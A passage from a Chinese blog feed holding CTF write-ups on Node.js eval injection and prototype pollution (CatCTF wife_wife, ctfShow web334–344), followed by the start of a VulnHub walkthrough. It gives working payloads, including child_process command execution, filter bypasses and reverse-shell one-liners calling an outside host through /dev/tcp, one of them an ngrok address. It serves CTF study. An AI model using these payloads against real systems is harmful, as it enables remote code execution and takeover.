href=\"#catctf-2022-wife_wife\">#</a> CatCTF 2022 wife_wife</h3>\n<p>一道简单的 js 原型链污染，要邀请码才能注册为 admin，普通用户只能拿到 wife，没有 flag。</p>\n<p>这里在 github 上面翻了翻源码</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>app<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/register'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> user <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>user<span class=\"token punctuation\">.</span>username <span class=\"token operator\">||</span> <span class=\"token operator\">!</span>user<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'empty username or password'</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">err</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">u</span> <span class=\"token operator\">=></span> u<span class=\"token punctuation\">.</span>username <span class=\"token operator\">==</span> user<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'username already exists'</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">err</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span>isAdmin <span class=\"token operator\">&amp;&amp;</span> user<span class=\"token punctuation\">.</span>inviteCode <span class=\"token operator\">!=</span> <span class=\"token constant\">INVITE_CODE</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        user<span class=\"token punctuation\">.</span>isAdmin <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'invalid invite code'</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">err</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">let</span> newUser <span class=\"token operator\">=</span> Object<span class=\"token punctuation\">.</span><span class=\"token function\">assign</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> baseUser<span class=\"token punctuation\">,</span> user<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    users<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>newUser<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'user created successfully'</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">err</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>上面的代码是 register 部分，这里可以看到这里使用了 Object.assign，将 baseUser 和 user 的属性合并后拷贝到 {} 中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230713130240833.png\" alt=\"image-20230713130240833\" /></p>\n<p>这里这样构造就能注册成功</p>\n<h3 id=\"ctfshow\"><a class=\"anchor\" href=\"#ctfshow\">#</a> ctfShow</h3>\n<h4 id=\"font-size5web334font\"><a class=\"anchor\" href=\"#font-size5web334font\">#</a> &lt;font size=5&gt;web334&lt;/font&gt;</h4>\n<p>这里给了两个文件</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>#login<span class=\"token punctuation\">.</span>js</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">var</span> express <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'express'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">var</span> router <span class=\"token operator\">=</span> express<span class=\"token punctuation\">.</span><span class=\"token function\">Router</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">var</span> users <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'../modules/user'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">var</span> <span class=\"token function-variable function\">findUser</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name<span class=\"token punctuation\">,</span> password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> users<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">item</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> name<span class=\"token operator\">!==</span><span class=\"token string\">'CTFSHOW'</span> <span class=\"token operator\">&amp;&amp;</span> item<span class=\"token punctuation\">.</span>username <span class=\"token operator\">===</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> item<span class=\"token punctuation\">.</span>password <span class=\"token operator\">===</span> password<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">/* GET home page. */</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>router<span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">req<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">,</span> next</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  res<span class=\"token punctuation\">.</span><span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">'html'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">var</span> flag<span class=\"token operator\">=</span><span class=\"token string\">'flag_here'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">var</span> sess <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">var</span> user <span class=\"token operator\">=</span> <span class=\"token function\">findUser</span><span class=\"token punctuation\">(</span>req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">,</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    req<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span><span class=\"token function\">regenerate</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">return</span> res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">ret_code</span><span class=\"token operator\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">ret_msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'登录失败'</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>       </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      req<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>loginUser <span class=\"token operator\">=</span> user<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">ret_code</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">ret_msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'登录成功'</span><span class=\"token punctuation\">,</span><span class=\"token literal-property property\">ret_flag</span><span class=\"token operator\">:</span>flag<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>              </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    res<span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">ret_code</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">ret_msg</span><span class=\"token operator\">:</span> <span class=\"token string\">'账号或密码错误'</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> router<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>和</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>#user<span class=\"token punctuation\">.</span>js</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>module<span class=\"token punctuation\">.</span>exports <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token literal-property property\">items</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">username</span><span class=\"token operator\">:</span> <span class=\"token string\">'CTFSHOW'</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">password</span><span class=\"token operator\">:</span> <span class=\"token string\">'123456'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里在 user.js 这里直接给到了用户名和密码，这里直接登录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230713135447187.png\" alt=\"image-20230713135447187\" /></p>\n<h4 id=\"font-size5web335font\"><a class=\"anchor\" href=\"#font-size5web335font\">#</a> &lt;font size=5&gt;web335&lt;/font&gt;</h4>\n<p>这题看到源码有一个 eval 参数</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230713144300225.png\" alt=\"image-20230713144300225\" /></p>\n<p>这里应该使用的是 eval 函数，JavaScript 中 eval 函数和 php 中一样，都会将传入的字符串当做代码执行，这里也是记录一下</p>\n<h5 id=\"font-size5child_processfont\"><a class=\"anchor\" href=\"#font-size5child_processfont\">#</a> &lt;font size=5&gt;child_process&lt;/font&gt;</h5>\n<p>一个 node 的子进程的 API，可以创建一个子进程用于命令执行，下面是 4 中创建子进程的方式</p>\n<ol>\n<li>\n<p>child_process.exec(command[, options][, callback])</p>\n<p>创建一个 shell，然后在 shell 里执行命令。执行完成后，将 stdout、stderr 作为参数传入回调方法。</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">let</span> test <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"child_process\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>test<span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">'dir'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">error<span class=\"token punctuation\">,</span>stdout</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'stdout: '</span> <span class=\"token operator\">+</span> stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230713182530606.png\" alt=\"image-20230713182530606\" /></p>\n<p>这里可以看到能够列出当前目录</p>\n</li>\n<li>\n<p>child_process.execFile(file[, args][, options][, callback])</p>\n<p>跟 .exec () 类似，不同点在于，没有创建一个新的 shell，<strong>options 参数与 exec 一样</strong>；这个方式是去运行一个可执行文件</p>\n</li>\n</ol>\n<p>这里直接构造 payload</p>\n<pre><code class=\"language-perl\">require(&quot;child_process&quot;).execSync('ls')\nrequire(&quot;child_process&quot;).execSync(%27cat%20fl00g.txt%27)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230713210454290.png\" alt=\"image-20230713210454290\" /></p>\n<h4 id=\"web336\"><a class=\"anchor\" href=\"#web336\">#</a> web336</h4>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230713210920570.png\" alt=\"image-20230713210920570\" /></p>\n<p>同样的配方，不过这里过滤了 exec，这里可以先通过全局变量__filename 来看一下当前模版文件的绝对路径</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230713212107959.png\" alt=\"image-20230713212107959\" /></p>\n<p>PS：__dirname 可以返回当前目录的绝对路径</p>\n<p>然后读取文件</p>\n<pre><code class=\"language-perl\">?eval=require('fs').readFileSync('/app/routes/index.js','utf-8')\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230713212421916.png\" alt=\"image-20230713212421916\" /></p>\n<p>使用 spawnSync 也是一样的作用</p>\n<pre><code class=\"language-perl\">?eval=require(&quot;child_process&quot;).spawnSync(%27ls%27).stdout.toString()\n?eval=require( 'child_process' ).spawnSync( 'cat',['fl001g.txt'] ).stdout.toString()\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230713211238716.png\" alt=\"image-20230713211238716\" /></p>\n<p>这里换了一种方法，但是如果两种方法都被过滤了该怎么做呢？在 php 中这种情况可以使用字符串拼接的方式，这里当然也是可以的，PS：因为 + 会被解析为空格，所以这里使用编码 %2b</p>\n<pre><code class=\"language-perl\">?eval=eval(&quot;require('child_process').exe&quot;%2b&quot;cSync('ls')&quot;)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230713212313742.png\" alt=\"image-20230713212313742\" /></p>\n<p>这里前面读取文件的时候使用了 fs 这样一个包，这里同样也可以通过它来读取 flag</p>\n<pre><code class=\"language-perl\">?eval=require('fs').readdirSync('.')\n?eval=require('fs').readFileSync('fl001g.txt','utf-8')\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230713212552850.png\" alt=\"image-20230713212552850\" /></p>\n<h4 id=\"web337\"><a class=\"anchor\" href=\"#web337\">#</a> web337</h4>\n<p>题目介绍中给了这样一段信息</p>\n<pre><code class=\"language-JavaScript\">var express = require('express');\nvar router = express.Router();\nvar crypto = require('crypto');\n\nfunction md5(s) &#123;\n  return crypto.createHash('md5')\n    .update(s)\n    .digest('hex');\n&#125;\n\n/* GET home page. */\nrouter.get('/', function(req, res, next) &#123;\n  res.type('html');\n  var flag='xxxxxxx';\n  var a = req.query.a;\n  var b = req.query.b;\n  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;\n  \tres.end(flag);\n  &#125;else&#123;\n  \tres.render('index',&#123; msg: 'tql'&#125;);\n  &#125;\n  \n&#125;);\n\nmodule.exports = router;\n</code></pre>\n<p>关键点就是那个 if 判断，这里直接用之前做题的思路，数组绕过即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714071005380.png\" alt=\"image-20230714071005380\" /></p>\n<h4 id=\"web338\"><a class=\"anchor\" href=\"#web338\">#</a> web338</h4>\n<p>这题源码都给我们了，简单看一下，发现当 secert.ctfshow==='36dboy' 的时候能拿到 flag</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714071318743.png\" alt=\"image-20230714071318743\" /></p>\n<p>这里的利用点其实就是在 copy 这个函数中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714071658698.png\" alt=\"image-20230714071658698\" /></p>\n<p>这里和网上的师傅介绍原型链污染的时候给的例子一样这里因为 user 和 secert 都是直接继承 Object 这里通过 user 去污染 Object 即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714072613626.png\" alt=\"image-20230714072613626\" /></p>\n<h4 id=\"web339\"><a class=\"anchor\" href=\"#web339\">#</a> web339</h4>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714073255520.png\" alt=\"image-20230714073255520\" /></p>\n<p>相较于上一题这里做了一些改变，这里想要相等完全是不可能的，就需要找新的利用点</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714073539722.png\" alt=\"image-20230714073539722\" /></p>\n<p>这里看到相较于上一题多了一个 api 文件，这里这个 query 很显然也是来自 Object，这里直接污染后 rce 反弹 shell 即可</p>\n<pre><code class=\"language-perl\">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xxx/xxxxx 0&gt;&amp;1\\&quot;')&quot;&#125;&#125;\n</code></pre>\n<p>这里因为 Function 的环境没有 require 函数不能获得 child_process 模块，这里用 process.mainModule.constructor._load 就行</p>\n<h4 id=\"web340\"><a class=\"anchor\" href=\"#web340\">#</a> web340</h4>\n<p>做法与上一题一样</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714075507359.png\" alt=\"image-20230714075507359\" /></p>\n<p>不过这里 user 是一个类，那么 user.__proto__就不是指向 Object.prototype 了 user.__proto.__proto__才是，这里 payload 简单改一下即可</p>\n<pre><code class=\"language-perl\">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/xxx.xx.xxx.xxx/xxxxx 0&gt;&amp;1\\&quot;')&quot;&#125;&#125;&#125;\n</code></pre>\n<h4 id=\"web341\"><a class=\"anchor\" href=\"#web341\">#</a> web341</h4>\n<p>预期解 ejs rce<br />\npayload:</p>\n<pre><code class=\"language-perl\">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/xxx/4567 0&gt;&amp;1\\&quot;');var __tmp2&quot;&#125;&#125;&#125;\n</code></pre>\n<p>然后再刷新一下页面</p>\n<h4 id=\"web342web343\"><a class=\"anchor\" href=\"#web342web343\">#</a> web342，web343</h4>\n<p>jade 原型链污染 https://xz.aliyun.com/t/7025</p>\n<pre><code class=\"language-perl\">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Block&quot;,&quot;nodes&quot;:&quot;&quot;,&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require('child_process').exec('bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/6.tcp.ngrok.io/11125&gt;&amp;1\\&quot;')&quot;&#125;&#125;&#125;\n</code></pre>\n<p>在 login 页面打上去之后随便访问下，就会反弹</p>\n<h4 id=\"web344\"><a class=\"anchor\" href=\"#web344\">#</a> web344</h4>\n<pre><code class=\"language-JavaScript\">router.get('/', function(req, res, next) &#123;\n  res.type('html');\n  var flag = 'flag_here';\n  if(req.url.match(/8c|2c|\\,/ig))&#123;\n  \tres.end('where is flag :)');\n  &#125;\n  var query = JSON.parse(req.query.query);\n  if(query.name==='admin'&amp;&amp;query.password==='ctfshow'&amp;&amp;query.isVIP===true)&#123;\n  \tres.end(flag);\n  &#125;else&#123;\n  \tres.end('where is flag. :)');\n  &#125;\n\n&#125;);\n</code></pre>\n<p>这里直接这样传就行</p>\n<pre><code class=\"language-perl\">?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230714081559412.png\" alt=\"image-20230714081559412\" /></p>\n",
            "tags": [
                "CTFshow",
                "nodeJs"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/07/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%A4%E8%80%81%E7%9A%84%E9%9D%B6%E6%9C%BAmedium_socnet%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/",
            "url": "https://blog.xcu.icu/2023/07/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%A4%E8%80%81%E7%9A%84%E9%9D%B6%E6%9C%BAmedium_socnet%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/",
            "title": "记一次古老的靶机medium_socnet的打靶记录",
            "date_published": "2023-07-10T16:00:00.000Z",
            "content_html": "<h1 id=\"medium_socnet靶机记录\"><a class=\"anchor\" href=\"#medium_socnet靶机记录\">#</a> medium_socnet 靶机记录</h1>\n<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>最近一段时间各种忙，我又各种懒，最后一科课业答辩结束后突然就闲下来了，突然之间不知道该干什么了，找了一个靶机浅浅的玩一下，这里做一个简单的记录，靶机的下载地址是<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvYm9yZWRoYWNrZXJibG9nLXNvY2lhbC1uZXR3b3JrLDQ1NC8=\">无聊黑客博客： 社交网络～VulnHub</span>，这个是一个很老的靶机了，所以虽然是中等难度，做起来还是比较轻松的</p>\n<h2 id=\"靶机描述\"><a class=\"anchor\" href=\"#靶机描述\">#</a> 靶机描述</h2>\n<p>留言是一个新的匿名社交网站，用户可以在其中为彼此发布消息。 他们指派您测试他们的设置。他们确实使用码头工人容器。您也可以对这些进行攻击。尝试看看是否可以在主机上获得 root 权限。</p>\n<p>难度：中级</p>\n<p>涉及的任务：</p>\n<ul>\n<li>端口扫描</li>\n<li>网页应用攻击</li>\n<li>代码注入</li>\n<li>旋转</li>\n<li>开发</li>\n<li>密码破解</li>\n<li>暴力破解</li>\n</ul>\n<p>虚拟机：</p>\n<ul>\n<li>格式： 虚拟机 （Virtualbox OVA）</li>\n<li>操作系统： Linux.</li>\n</ul>\n<p>联网：</p>\n<ul>\n<li>DHCP 服务：已启用</li>\n<li>IP 地址自动分配</li>\n</ul>\n<p>这在 VirtualBox 而不是 VMware 上效果更好。</p>\n<h2 id=\"攻击流程\"><a class=\"anchor\" href=\"#攻击流程\">#</a> 攻击流程</h2>\n<h3 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h3>\n<p>这里因为靶机和我的 kali 都使用 nat 模式都在一局域网中，这里直接使用 arp-scan 来进行一个主机发现</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710211421646.png\" alt=\"image-20230710211421646\" /></p>\n<p>当然这里直接使用 nmap 也是可以的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230710211548048.png\" alt=\"image-20230710211548048\" /></p>\n<p>这里可以看到，目标靶机是开启了 22 端口和 5000 端口，接下来使用 